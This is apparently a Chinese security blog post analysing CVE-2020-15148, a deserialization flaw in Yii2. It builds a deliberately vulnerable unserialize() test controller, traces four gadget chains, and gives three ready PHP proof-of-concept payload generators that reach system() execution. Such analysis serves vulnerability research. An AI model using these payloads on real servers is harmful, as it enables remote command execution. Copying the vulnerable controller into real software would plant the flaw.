<hr>
<p>title: CVE-2020-15148 Yii框架反序列化<br>no-emoji: false<br>date: 2020-09-21 13:49:01<br>tags:<br>top:</p>
<hr>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/yiisoft/yii2/releases">yii下载地址</a>  </p>
<p>影响范围 </p>
<ul>
<li>Yii2 &lt; 2.0.38</li>
</ul>
<p>选择一个漏洞影响的版本  <code>yii-basic-app-2.0.37.tgz</code><br>下载后解压到 web 目录下，修改配置文件 <code>config/web.php</code> ，给 <code>cookieValidationKey</code> 字段设置一个值。<br><img src="20200921140607.png"></p>
<p>然后添加一个存在漏洞的 <code>Action</code><br><code>/controllers/TestController.php</code>   </p>
<pre><code class="php">&lt;?php

namespace app\controllers;

use Yii;
use yii\web\Controller;

class TestController extends Controller
{
    public function actionTest(){
        $name = Yii::$app-&gt;request-&gt;get(&#39;unserialize&#39;);
        return unserialize(base64_decode($name));

    }
}

?&gt;</code></pre>
<p>测试运行成功<br><img src="20200921143210.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><hr>
<h3 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链 1"></a>利用链 1</h3><p>查看 github 的 <a href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99?branch=9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99&diff=split">commit 记录</a><br><img src="20200921150420.png"><br><img src="20200921150511.png"><br><img src="20200921150029.png"></p>
<p>发现在 <code>/db/BatchQueryResult.php</code> 中新增了 <code> __wakeup()</code> 方法，在 <code> __wakeup()</code> 方法中抛出异常。</p>
<blockquote>
<p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
</blockquote>
<p>利用 <code> __wakeup()</code> 方法抛出一个异常，本质上是为了防止 BatchQueryResult 类被反序列化。  </p>
<p>猜测 BatchQueryResult 类为反序列化的起点 </p>
<p><code>vendor/yiisoft/yii2/db/BatchQueryResult.php::__destruct</code>   </p>
<pre><code class="php">public function __destruct()
{
    // make sure cursor is closed
    $this-&gt;reset();
}


public function reset()
{
    if ($this-&gt;_dataReader !== null) {
        $this-&gt;_dataReader-&gt;close();
    }
    $this-&gt;_dataReader = null;
    $this-&gt;_batch = null;
    $this-&gt;_value = null;
    $this-&gt;_key = null;
}</code></pre>
<blockquote>
<p>__destruct ( void ) : void<br>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。<br><img src="20200921163338.png">  </p>
</blockquote>
<p><code>__destruct</code> 方法里面调用了 <code>reset</code> 方法， <code>reset</code> 方法里面又调用了 <code>close</code> 方法。<br><code>$this-&gt;_dataReader</code> 的值可控，所以可以当作跳板去执行其他类中的魔术方法 <code>__call()</code> 方法。  </p>
<blockquote>
<p>public __call ( string $name , array $arguments ) : mixed<br>在对象中调用一个不可访问方法时，__call() 会被调用。<br>$name 参数是要调用的方法名称。$arguments 参数是一个枚举数组，包含着要传递给方法 $name 的参数。<br><img src="20200921162407.png"></p>
</blockquote>
<p>了解 <code>__call()</code> 方法之后，我们就可以进行全局搜索，找到其中不包含 <code>close</code>方法的类，就可以执行该类的<code>__call()</code> 方法。</p>
<p>全局搜索 <code>function __call(</code> </p>
<p><code>vendor/fzaninotto/faker/src/Faker/Generator.php::__call</code></p>
<pre><code class="php">public function __call($method, $attributes)
    {
        return $this-&gt;format($method, $attributes);
    }</code></pre>
<p>跟进 format</p>
<p><code>vendor/fzaninotto/faker/src/Faker/Generator.php::format</code></p>
<pre><code class="php">public function format($formatter, $arguments = array())
{
    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);
}</code></pre>
<p>format 中调用了 <code>call_user_func_array</code> 方法 ，<strong>$formatter</strong> 与 <strong>$agruments</strong> 我们都不可控。此时 <strong>$formatter = close</strong>,<strong>$agruments</strong>为空。<br><strong>$formatter</strong> 传递至 getFormatter()<br><code>vendor/fzaninotto/faker/src/Faker/Generator.php::getFormatter</code></p>
<pre><code class="php">public function getFormatter($formatter)
{
    if (isset($this-&gt;formatters[$formatter])) {
        return $this-&gt;formatters[$formatter];
    }
    foreach ($this-&gt;providers as $provider) {
        if (method_exists($provider, $formatter)) {
            $this-&gt;formatters[$formatter] = array($provider, $formatter);

            return $this-&gt;formatters[$formatter];
        }
    }
    throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));
}</code></pre>
<p>我们注意到在 <code>getFormatter</code> 方法中，<strong>$this-&gt;formatters[$formatter]</strong> 是我们可以控制的，<code>getFormatter</code> 方法返回值是可控的。那么 <code>call_user_func_array</code> 这个函数的第一个参数可控，第二个参数为空。此时我们就可以调用 yii 框架中的任何一个无参的方法了。</p>
<blockquote>
<p>call_user_func_array ( callable $callback , array $param_arr ) : mixed<br>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的参数传入。<br><img src="20200922112636.png"><br>调用类中的公共方法可以利用 <code>call_user_func_array([&#39;类名&#39;,&#39;类中的方法&#39;],[]);</code><br><img src="20200922113055.png"></p>
</blockquote>
<p>全局搜索 <code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code> 找到使用 <code>call_user_func</code> 函数，且参数为类中成员变量的所有方法。<br><img src="20200921172545.png"></p>
<p>利用其中的 <code>vendor/yiisoft/yii2/rest/CreateAction.php::run</code>  </p>
<pre><code class="php">public function run()
{
    if ($this-&gt;checkAccess) {
        call_user_func($this-&gt;checkAccess, $this-&gt;id);
    }
    ......
}</code></pre>
<p><code> $this-&gt;checkAccess</code> 以及  <code>$this-&gt;id</code> 都可控</p>
<p>所以利用链为：</p>
<blockquote>
<p>yii\db\BatchQueryResult::__destruct()<br>yii\db\BatchQueryResult::reset()<br>Faker\Generator::__call()<br>Faker\Generator::format(‘close’,[])<br>call_user_func_array([‘new yii\rest\CreateAction’,’run’],[])<br>yii\rest\CreateAction::run()<br>call_user_func(‘system’,’whoami’)</p>
</blockquote>
<pre><code class="php">$n = yii\db\BatchQueryResult{
    $this-&gt;_dataReader =  Faker\Generator{
        $this-&gt;formatters[&#39;close&#39;] = [
            yii\rest\CreateAction{
                $this-&gt;checkAccess = &#39;system&#39;;
                $this-&gt;id = &#39;whoami&#39;;
            }
            ,&#39;run&#39;];
    }
}</code></pre>
<p>POC  </p>
<pre><code class="php">&lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this-&gt;checkAccess = &#39;system&#39;;
            $this-&gt;id = &#39;whoami&#39;;
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this-&gt;formatters[&#39;close&#39;] = [new CreateAction(), &#39;run&#39;];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this-&gt;_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?&gt;</code></pre>
<hr>
<h3 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h3><p>BatchQueryResult 类仍为反序列化的起点，不利用魔术方法 __call()，选择将 <code>$this-&gt;_dataReader</code> 赋值为一个存在 <code>close</code> 方法的类，找到该类中 <code>close</code>方法调用中存在代码执行。</p>
<p><code>\yii2\web\DbSession::close</code></p>
<pre><code class="php">public function close()
{
    if ($this-&gt;getIsActive()) {
        // prepare writeCallback fields before session closes
        $this-&gt;fields = $this-&gt;composeFields();
        YII_DEBUG ? session_write_close() : @session_write_close();
    }
}</code></pre>
<p>当 <code>$this-&gt;getIsActive()</code> 为 true 时，则会调用 <code>$this-&gt;composeFields()</code><br>跟进 DbSession 的父类 MultiFieldSession 的父类 Session<br><code>\yii2\web\Session::getIsActive</code></p>
<pre><code class="php">public function getIsActive()
    {
        return session_status() === PHP_SESSION_ACTIVE;
    }</code></pre>
<p>当Yii的debug和gii这两个默认扩展都存在（不一定要开启）时，这里返回true。否则返回false。默认安装情况下都返回true。<br>跟进 composeFields 方法，在DbSession 的父类 MultiFieldSession 中实现<br><code>\yii\web\MultiFieldSession::composeFields</code>  </p>
<pre><code class="php">protected function composeFields($id = null, $data = null)
{
    $fields = $this-&gt;writeCallback ? call_user_func($this-&gt;writeCallback, $this) : [];
    if ($id !== null) {
        $fields[&#39;id&#39;] = $id;
    }
    if ($data !== null) {
        $fields[&#39;data&#39;] = $data;
    }
    return $fields;
}</code></pre>
<p>发现调用了call_user_func函数， <code>$this-&gt;writeCallback</code> 可控，其余参数不可控。可以通过控制 <code>$this-&gt;writeCallback</code> 为 [‘类名’,’类中的方法’] 来实现调用类中的方法。<br><img src="20200922140801.png"></p>
<p>全局搜索 <code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+)</code> </p>
<p>利用其中的 <code>\yii\rest\IndexAction::run</code>  </p>
<pre><code class="php">public function run()
{
    if ($this-&gt;checkAccess) {
        call_user_func($this-&gt;checkAccess, $this-&gt;id);
    }

    return $this-&gt;prepareDataProvider();
}</code></pre>
<p>所以利用链为：</p>
<blockquote>
<p>yii\db\BatchQueryResult::__destruct()<br>yii\db\BatchQueryResult::reset()<br>yii\web\DbSession::close()<br>yii\web\MultiFieldSession::composeFields()<br>call_user_func_array([‘new yii\rest\IndexAction’,’run’],[])<br>yii\rest\IndexAction::run()<br>call_user_func(‘system’,’whoami’)</p>
</blockquote>
<p>POC </p>
<pre><code class="php">
&lt;?php
namespace yii\rest {
    class IndexAction
    {
        public $checkAccess;
        public $id;

        public function __construct()
        {
            $this-&gt;checkAccess = &#39;system&#39;;
            $this-&gt;id = &#39;whoami&#39;;
        }
    }
}
namespace yii\web {
    use yii\rest\IndexAction;
    class DbSession
    {
        public $writeCallback;
        public function __construct()
        {
            $this-&gt;writeCallback = [new IndexAction(), &quot;run&quot;];
        }
    }
}
namespace yii\db {
    use yii\web\DbSession;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct()
        {
            $this-&gt;_dataReader = new DbSession();
        }
    }
}

namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}</code></pre>
<hr>
<h3 id="利用链3"><a href="#利用链3" class="headerlink" title="利用链3"></a>利用链3</h3><p><code>\Codeception\Extension\RunProcess::__destruct</code></p>
<pre><code class="php">public function __destruct()
    {
        $this-&gt;stopProcess();
    }</code></pre>
<p><code>\Codeception\Extension\RunProcess::stopProcess</code></p>
<pre><code class="php">public function stopProcess()
    {
        foreach (array_reverse($this-&gt;processes) as $process) {
            /** @var $process Process  **/
            if (!$process-&gt;isRunning()) {
                continue;
            }
            $this-&gt;output-&gt;debug(&#39;[RunProcess] Stopping &#39; . $process-&gt;getCommandLine());
            $process-&gt;stop();
        }
        $this-&gt;processes = [];
    }</code></pre>
<p>注意到 RunProcess 中的 <code>__destruct</code> 方法调用了 <code>stopProcess()</code> 方法， <code>stopProcess()</code> 方法 中的 <code>$this-&gt;processes</code> 可控，则 <code>$process</code> 可控，下面调用了 <code>$process-&gt;isRunning()</code> ，则又可以利用魔术方法 <code>__call()</code>。</p>
<p>利用链</p>
<blockquote>
<p>\Codeception\Extension\RunProcess::__destruct()<br>\Codeception\Extension\RunProcess::stopProcess()<br>Faker\Generator::__call()<br>Faker\Generator::format(‘close’,[])<br>call_user_func_array([‘new yii\rest\CreateAction’,’run’],[])<br>yii\rest\CreateAction::run()<br>call_user_func(‘system’,’whoami’)</p>
</blockquote>
<p>poc</p>
<pre><code class="php">&lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this-&gt;checkAccess = &#39;system&#39;;
            $this-&gt;id = &#39;whoami&#39;;
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this-&gt;formatters[&#39;isRunning&#39;] = [new CreateAction(), &#39;run&#39;];
        }
    }
}

namespace Codeception\Extension{
    use Faker\Generator;

    class RunProcess{
        private $processes;

        public function __construct(){
            $this-&gt;processes = [new Generator];
        }
    }
}
namespace{
    echo base64_encode(serialize(new Codeception\Extension\RunProcess));
}
?&gt;</code></pre>
<hr>
<h3 id="利用链4"><a href="#利用链4" class="headerlink" title="利用链4"></a>利用链4</h3><p><code>\Swift_KeyCache_DiskKeyCache::__destruct</code></p>
<pre><code class="php">public function __destruct()
{
    foreach ($this-&gt;keys as $nsKey =&gt; $null) {
        $this-&gt;clearAll($nsKey);
    }
}</code></pre>
<p><code>\Swift_KeyCache_DiskKeyCache::clearAll</code></p>
<pre><code class="php">public function clearAll($nsKey)
{
    if (array_key_exists($nsKey, $this-&gt;keys)) {
        foreach ($this-&gt;keys[$nsKey] as $itemKey =&gt; $null) {
            $this-&gt;clearKey($nsKey, $itemKey);
        }
        if (is_dir($this-&gt;path.&#39;/&#39;.$nsKey)) {
            rmdir($this-&gt;path.&#39;/&#39;.$nsKey);
        }
        unset($this-&gt;keys[$nsKey]);
    }
}</code></pre>
<p>因为 <code>$nsKey</code> <code>$this-&gt;keys</code> 可控，跟进<code>$this-&gt;clearKey(·</code></p>
<p><code>\Swift_KeyCache_DiskKeyCache::clearKey</code></p>
<pre><code class="php">public function clearKey($nsKey, $itemKey)
{
    if ($this-&gt;hasKey($nsKey, $itemKey)) {
        $this-&gt;freeHandle($nsKey, $itemKey);
        unlink($this-&gt;path.&#39;/&#39;.$nsKey.&#39;/&#39;.$itemKey);
    }
}</code></pre>
<p><code>$this-&gt;path</code> 可控 ，进行了字符串的拼接操作，可以利用魔术方法 <code>__toString</code> 触发后续操作。</p>
<blockquote>
<p>__toString() 方法用于一个类被当成字符串时应怎样回应。<br><img src="20200922162854.png"></p>
</blockquote>
<p>然后全局搜索 <code>__toString</code> 方法<br><img src="20200922163338.png"></p>
<p><code>\phpDocumentor\Reflection\DocBlock\Tags\See::__toString</code></p>
<pre><code class="php">public function __toString() : string
{
    return $this-&gt;refers . ($this-&gt;description ? &#39; &#39; . $this-&gt;description-&gt;render() : &#39;&#39;);
}</code></pre>
<p><code>$this-&gt;description</code> 可控，则又可以利用魔术方法 <code>__call()</code>。</p>
<p>利用链</p>
<blockquote>
<p>\Swift_KeyCache_DiskKeyCache::__destruct()<br>\Swift_KeyCache_DiskKeyCache::clearAll()<br>\Swift_KeyCache_DiskKeyCache::clearKey()<br>\phpDocumentor\Reflection\DocBlock\Tags\See::__toString()<br>\Faker\Generator::__call()<br>\Faker\Generator::format(‘close’,[])<br>\call_user_func_array([‘new yii\rest\CreateAction’,’run’],[])<br>\yii\rest\CreateAction::run()<br>\call_user_func(‘system’,’whoami’)</p>
</blockquote>
<pre><code class="php"></code></pre>
<p>Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\Reflection\DocBlock\Tags\See::__toString()-&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA">CVE-2020-15148 Yii2反序列化RCE POP链分析</a><br><a href="https://mp.weixin.qq.com/s/qW2XgudMZV_5HuMlNcPE4Q">我是怎么挖掘yii2反序列化0day的</a></p>
